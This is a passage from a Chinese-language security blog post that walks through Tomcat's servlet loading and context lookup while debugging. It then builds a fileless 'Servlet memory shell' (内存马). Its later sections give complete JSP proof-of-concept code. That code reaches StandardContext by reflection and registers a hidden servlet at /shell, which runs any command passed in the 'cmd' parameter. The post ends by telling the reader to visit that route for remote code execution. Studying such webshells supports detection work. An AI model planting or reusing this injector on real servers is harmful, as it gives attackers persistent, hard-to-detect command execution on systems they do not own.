+<h4 id="Servlet装载流程分析"><a href="#Servlet装载流程分析" class="headerlink" title="Servlet装载流程分析"></a>Servlet装载流程分析</h4><p>在<code>org.apache.catalina.core.StandardWrapper#loadServlet</code>这里打下断点进行调试，重点关注<code>org.apache.catalina.core.StandardContext#startInternal</code></p>
+<p><img src="/../image/achieve/202411/java%E5%AD%A6%E4%B9%A0/image-20250820104157412.png" alt="image-20250820104157412"></p>
+<p>可以看到是在加载完Listener和Filter之后，才装载Servlet</p>
+<p><img src="/../image/achieve/202411/java%E5%AD%A6%E4%B9%A0/image-20250820104442636.png" alt="image-20250820104442636"></p>
+<p>所以在servlet容器启动之后会依次处理Listener-&gt;Filer-&gt;Servlet</p>
+<p>在最后的if中调用了一个loadOnstartup()方法，并调用findChildren()从StandardContext中拿到所有的child传入该方法中，我们跟进这个方法看看</p>
+<p><img src="/../image/achieve/202411/java%E5%AD%A6%E4%B9%A0/image-20250820105331376.png" alt="image-20250820105331376"></p>
+<p>根据注释的话其实也很明白了，可以看到，这段代码先是创建一个<code>TreeMap</code>，然后遍历传入的<code>Container</code>数组，将每个<code>Servlet</code>的<code>loadOnStartup</code>值作为键，将对应的<code>Wrapper</code>对象存储在相应的列表中；如果这个<code>loadOnStartup</code>值是负数，除非你请求访问它，否则就不会加载；如果是非负数，那么就按照这个<code>loadOnStartup</code>的升序的顺序来加载。</p>
+<p><img src="/../image/achieve/202411/java%E5%AD%A6%E4%B9%A0/image-20250820105339928.png" alt="image-20250820105339928"></p>
+<p>然后就是遍历Servlet数组并调用load()去加载了</p>
+<p>其实从这里的话我们可以更进一步的了解到load-on-startup属性的作用，其实简单来说就是定义是否在服务器启动的时候就加载这个servlet，并且这个属性的内容需要是一个整数，这样的话就可以明确servlet被加载的前后顺序，其实tomcat就相当于采用一种懒加载的机制，当该属性没被设置时，只有发送请求（servlet被调用的时候才会加载到context中）。</p>
+<p>回到我们最初的目的，既然我们需要动态注册servlet，然后可以联想到python内存马中的一个after_request和before_request钩子函数的使用，那么这里就同样需要设置一个load-on-startup属性</p>
+<h3 id="关于context的获取（漏掉啦）"><a href="#关于context的获取（漏掉啦）" class="headerlink" title="关于context的获取（漏掉啦）"></a>关于context的获取（漏掉啦）</h3><p>但是上面漏了讲一个点，就是关于context的获取，我们用传统的Tomcat去调试来看一下</p>
+<p>修改pom.xml如下</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span> <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/maven-v4_0_0.xsd&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.example<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>TestServlet<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">packaging</span>&gt;</span>war<span class="tag">&lt;/<span class="name">packaging</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span>TestServlet Maven Webapp<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">url</span>&gt;</span>http://maven.apache.org<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.8.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>javax.servlet<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>javax.servlet-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.0.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">scope</span>&gt;</span>provided<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.tomcat<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>tomcat-catalina<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>9.0.108<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">finalName</span>&gt;</span>TestServlet<span class="tag">&lt;/<span class="name">finalName</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>记得下载一下源代码，不然不好找</p>
+<p>在org.apache.catalina.startup.ContextConfig#configureContext()中</p>
+<p><img src="/../image/achieve/202411/java%E5%AD%A6%E4%B9%A0/image-20250820183336572.png" alt="image-20250820183336572"></p>
+<p>在底下可以看到，这里的话通过传入的webxml分析拿到的servlets和servletMapping</p>
+<p>我们在刚刚的for循环那里打个断点</p>
+<p><img src="/../image/achieve/202411/java%E5%AD%A6%E4%B9%A0/image-20250820183624102.png" alt="image-20250820183624102"></p>
+<p>这里的话会遍历所有的servlets的值，然后createWrapper()创建一个wrapper对象，我们走一遍循环看一下</p>
+<p>例如第一个servlet是default</p>
+<p><img src="/../image/achieve/202411/java%E5%AD%A6%E4%B9%A0/image-20250820184226972.png" alt="image-20250820184226972"></p>
+<p>经过setName后会在wrapper对象中设置一个name属性为default</p>
+<p><img src="/../image/achieve/202411/java%E5%AD%A6%E4%B9%A0/image-20250820184325416.png" alt="image-20250820184325416"></p>
+<p>经过setServletClass后会设置一个servletClass属性的值为org.apache.catalina.servlets.DefaultServlet</p>
+<p>最后通过addChild将该对象添加到context中</p>
+<p>然后我们来看一下如何将url 路径和 servlet 类做映射的</p>
+<p><img src="/../image/achieve/202411/java%E5%AD%A6%E4%B9%A0/image-20250820184805495.png" alt="image-20250820184805495"></p>
+<p>这里的话会遍历webxml中ServletMapping的键值</p>
+<p><img src="/../image/achieve/202411/java%E5%AD%A6%E4%B9%A0/image-20250820184847763.png" alt="image-20250820184847763"></p>
+<p>参照地下的数组和上面的entry的值可以知道，key就是<code>*.jspx</code>，而value就是<code>jsp</code>，之后会分别getKey获取key和getValue获取值并传到addServletMappingDecoded方法中调用并返回给context</p>
+<p>到这就是大致的思路，然后就是关于context的来源了</p>
+<p><img src="/../image/achieve/202411/java%E5%AD%A6%E4%B9%A0/image-20250820185051568.png" alt="image-20250820185051568"></p>
+<p>从this.context中可以看到这个context实际上就是StandardContext，那我们如何获取到StandardContext呢？</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HttpServletRequest.getServletContext.context.context</span><br></pre></td></tr></table></figure>
+
+<p>我们可以先调试一下，在TestServlet中的doGet方法打个断点</p>
+<p><img src="/../image/achieve/202411/java%E5%AD%A6%E4%B9%A0/image-20250820185241826.png" alt="image-20250820185241826"></p>
+<p>点击debug后弹出网页，我们访问TestServlet类映射的路由&#x2F;test</p>
+<p><img src="/../image/achieve/202411/java%E5%AD%A6%E4%B9%A0/image-20250820185437014.png" alt="image-20250820185437014"></p>
+<p>然后我们调用req.getServletContext()，回车在结果中看到一个context</p>
+<p><img src="/../image/achieve/202411/java%E5%AD%A6%E4%B9%A0/image-20250820185744882.png" alt="image-20250820185744882"></p>
+<p>这里可以看到有一个ApplicationContext，展开这个context后在里面找到一个context</p>
+<p><img src="/../image/achieve/202411/java%E5%AD%A6%E4%B9%A0/image-20250820185923979.png" alt="image-20250820185923979"></p>
+<p>很惊喜的发现这个context的值就是刚刚我们调试的时候的context值，所以这个context就是我们需要获取到的context值</p>
+<p>基于这些原理，我们就可以写出一个内存马的具体实现</p>
+<h2 id="03-2-Servlet内存马实现"><a href="#03-2-Servlet内存马实现" class="headerlink" title="03.2 Servlet内存马实现"></a>03.2 Servlet内存马实现</h2><h3 id="什么是Servlet内存马？"><a href="#什么是Servlet内存马？" class="headerlink" title="什么是Servlet内存马？"></a>什么是Servlet内存马？</h3><p>Servlet内存马是通过动态注册servlet来实现的一种内存攻击手段。在Java Web应用中，Servlet作为处理客户端请求的核心组件之一，能够直接处理http请求并返回响应。攻击者利用该特点，通过程序化地向Web容器例如Tomcat在运行时注册恶意的Servlet对象，使得该servlet能够在没用实际文件存在的情况下执行恶意程序。</p>
+<p><a target="_blank" rel="noopener" href="https://longlone.top/%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/%E5%86%85%E5%AD%98%E9%A9%AC/Tomcat-Servlet%E5%9E%8B/#%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90">https://longlone.top/%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/%E5%86%85%E5%AD%98%E9%A9%AC/Tomcat-Servlet%E5%9E%8B/#%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90</a></p>
+<h3 id="Servlet内存马的条件和注入方式1"><a href="#Servlet内存马的条件和注入方式1" class="headerlink" title="Servlet内存马的条件和注入方式1"></a>Servlet内存马的条件和注入方式1</h3><p>从 Servlet 3.0 规范开始 (对应 Tomcat 7.0 及以上版本)，Java Web 才正式支持通过 ServletContext 对象<strong>动态地</strong>、<strong>以编程方式</strong>注册新的 Servlet、Filter 和 Listener。</p>
+<p>从上面的分析来看，实现内存马的步骤主要就是以下几个部分：</p>
+<ol>
+<li>找到<code>StandardContext</code></li>
+<li>继承并编写一个恶意<code>servlet</code></li>
+<li>创建<code>Wapper</code>对象</li>
+<li>设置<code>Servlet</code>的<code>LoadOnStartUp</code>的值</li>
+<li>设置<code>Servlet</code>的<code>Name</code></li>
+<li>设置<code>Servlet</code>对应的<code>Class</code></li>
+<li>将<code>Servlet</code>添加到<code>context</code>的<code>children</code>中</li>
+<li>将<code>url</code>路径和<code>servlet</code>类做映射</li>
+</ol>
+<h3 id="内存马POC编写"><a href="#内存马POC编写" class="headerlink" title="内存马POC编写"></a>内存马POC编写</h3><p>由浅入深我们先熟悉一下动态注册Servlet的过程</p>
+<p>例如我们尝试写了一个恶意的jsp文件</p>
+<p>第一步就是获取到StandardContext，这一步我们可以通过反射去实现</p>
+<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    <span class="comment">//反射获取StandardContext</span></span><br><span class="line">    <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getServletContext();</span><br><span class="line">    <span class="type">Field</span> <span class="variable">appctx</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    appctx.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext) appctx.get(servletContext);</span><br><span class="line">    <span class="type">Field</span> <span class="variable">stdctx</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    stdctx.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) stdctx.get(applicationContext);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
+
+<p>不过这里的话还有一种可以获取到StandardContext的方法</p>
+<p>同样的，在doGet打个断点然后访问&#x2F;test</p>
+<p><img src="/../image/achieve/202411/java%E5%AD%A6%E4%B9%A0/image-20250821105256731.png" alt="image-20250821105256731"></p>
+<p>在底下可以看到一个request字段表示一个Request对象，然后我们传入<code>((RequestFacade) req).request.getContext()</code>表达式</p>
+<p><img src="/../image/achieve/202411/java%E5%AD%A6%E4%B9%A0/image-20250821105527551.png" alt="image-20250821105527551"></p>
+<p>成功找到这个context，由此可得</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 更简单的方法 获取StandardContext</span></span><br><span class="line">   <span class="type">Field</span> <span class="variable">reqF</span> <span class="operator">=</span> request.getClass().getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">   reqF.setAccessible(<span class="literal">true</span>);</span><br><span class="line">   <span class="type">Request</span> <span class="variable">req</span> <span class="operator">=</span> (Request) reqF.get(request);</span><br><span class="line">   <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) req.getContext();</span><br></pre></td></tr></table></figure>
+
+<p>第二步就是编写一个恶意<code>servlet</code></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">S</span> <span class="keyword">implements</span> <span class="title class_">Servlet</span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(ServletConfig config)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> ServletConfig <span class="title function_">getServletConfig</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">service</span><span class="params">(ServletRequest req, ServletResponse res)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> req.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(cmd != <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Runtime.getRuntime().exec(cmd);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException e)&#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span>&#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getServletInfo</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这时候就有人要问了，哎？为啥要写那几个额外的方法</p>
+<p>我们跟进Servlet接口看看</p>
+<p><img src="/../image/achieve/202411/java%E5%AD%A6%E4%B9%A0/image-20250821112608735.png" alt="image-20250821112608735"></p>
+<p>可以看到这里这个接口需要实现这些方法的具体实现，而类实现接口的话就必须要实现接口所有方法（除非的抽象类），那这几个方法的作用和原理分别是什么呢？</p>
+<table>
+<thead>
+<tr>
+<th>方法</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>init(ServletConfig config)</code></td>
+<td><strong>初始化方法</strong>。在 Servlet 第一次被加载时调用，用来做初始化工作，比如读取配置参数、建立数据库连接等。</td>
+</tr>
+<tr>
+<td><code>getServletConfig()</code></td>
+<td>返回 Servlet 的配置信息（<code>ServletConfig</code> 对象），通常在 <code>init</code> 中保存该对象，方便后续使用。</td>
+</tr>
+<tr>
+<td><code>service(ServletRequest req, ServletResponse res)</code></td>
+<td><strong>核心方法</strong>。处理每一个客户端请求。Servlet 容器每次接收到请求都会调用它。通常会在这里根据请求类型调用 <code>doGet</code>、<code>doPost</code> 等方法。</td>
+</tr>
+<tr>
+<td><code>getServletInfo()</code></td>
+<td>返回 Servlet 的一些描述信息（比如版本、作者等），通常用于管理工具或文档，不是必须业务逻辑。</td>
+</tr>
+<tr>
+<td><code>destroy()</code></td>
+<td>在 Servlet 被卸载或服务器关闭前调用，用于释放资源，比如关闭数据库连接、清理缓存等。</td>
+</tr>
+</tbody></table>
+<p>第三步就是要包装一下这个servlet，为了方便看，我把servlet初始化的流程搬过来</p>
+<ul>
+<li><code>Wrapper wrapper = context.createWrapper();</code> 创建 Wapper 对象</li>
+<li><code>wrapper.setLoadOnStartup(servlet.getLoadOnStartup().intValue());</code> 设置的LoadOnStartUp 的值</li>
+<li><code>wrapper.setName(servlet.getServletName());</code>设置 Servlet 的 Name</li>
+<li><code>wrapper.setServletClass(servlet.getServletClass());</code>设置 Servlet 对应的 Class全限定类名</li>
+<li><code>context.addChild(wrapper);</code>将 Servlet 添加到 context 的 children 中</li>
+<li><code>context.addServletMappingDecoded(entry.getKey(), entry.getValue());</code>将 url 路径和 servlet 类做映射</li>
+</ul>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">S</span> <span class="variable">servlet</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">S</span>();</span><br><span class="line"><span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> servlet.getClass().getSimpleName();</span><br><span class="line"><span class="type">Wrapper</span> <span class="variable">newwrapper</span> <span class="operator">=</span> standardContext.createWrapper();</span><br><span class="line">newwrapper.setName(name);</span><br><span class="line">newwrapper.setLoadOnStartup(<span class="number">1</span>);</span><br><span class="line">newwrapper.setServlet(servlet);</span><br><span class="line">newwrapper.setServletClass(servlet.getClass().getName());</span><br><span class="line">standardContext.addChild(newwrapper);</span><br><span class="line">standardContext.addServletMappingDecoded(<span class="string">&quot;/shell&quot;</span>,name);</span><br></pre></td></tr></table></figure>
+
+<p>所以最后的完整poc就是</p>
+<h2 id="03-3完整POC1"><a href="#03-3完整POC1" class="headerlink" title="03.3完整POC1"></a>03.3完整POC1</h2><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.Wrapper&quot;</span> %&gt;</span><br><span class="line">&lt;%--&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.connector.Request&quot;</span> %&gt;--%&gt;</span><br><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">S</span> <span class="keyword">implements</span> <span class="title class_">Servlet</span>&#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(ServletConfig config)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> ServletConfig <span class="title function_">getServletConfig</span><span class="params">()</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">service</span><span class="params">(ServletRequest req, ServletResponse res)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> req.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span>(cmd != <span class="literal">null</span>)&#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    Runtime.getRuntime().exec(cmd);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException e)&#123;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span>&#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> String <span class="title function_">getServletInfo</span><span class="params">()</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    <span class="comment">//反射获取StandardContext</span></span><br><span class="line">    <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getServletContext();</span><br><span class="line">    <span class="type">Field</span> <span class="variable">appctx</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    appctx.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext) appctx.get(servletContext);</span><br><span class="line">    <span class="type">Field</span> <span class="variable">stdctx</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    stdctx.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) stdctx.get(applicationContext);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 更简单的方法 获取StandardContext</span></span><br><span class="line"><span class="comment">//    Field reqF = request.getClass().getDeclaredField(&quot;request&quot;);</span></span><br><span class="line"><span class="comment">//    reqF.setAccessible(true);</span></span><br><span class="line"><span class="comment">//    Request req = (Request) reqF.get(request);</span></span><br><span class="line"><span class="comment">//    StandardContext standardContext = (StandardContext) req.getContext();</span></span><br><span class="line"></span><br><span class="line">    <span class="type">S</span> <span class="variable">servlet</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">S</span>();</span><br><span class="line">    <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> servlet.getClass().getSimpleName();</span><br><span class="line">    <span class="type">Wrapper</span> <span class="variable">newwrapper</span> <span class="operator">=</span> standardContext.createWrapper();</span><br><span class="line">    newwrapper.setName(name);</span><br><span class="line">    newwrapper.setLoadOnStartup(<span class="number">1</span>);</span><br><span class="line">    newwrapper.setServlet(servlet);</span><br><span class="line">    newwrapper.setServletClass(servlet.getClass().getName());</span><br><span class="line">    standardContext.addChild(newwrapper);</span><br><span class="line">    standardContext.addServletMappingDecoded(<span class="string">&quot;/shell&quot;</span>,name);</span><br><span class="line"></span><br><span class="line">    out.println(<span class="string">&quot;inject success&quot;</span>);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
+
+<p>写完后启动服务器并访问这个jsp文件</p>
+<p><img src="/../image/achieve/202411/java%E5%AD%A6%E4%B9%A0/image-20250821120123363.png" alt="image-20250821120123363"></p>
+<p>然后访问我们刚刚的路由并RCE</p>
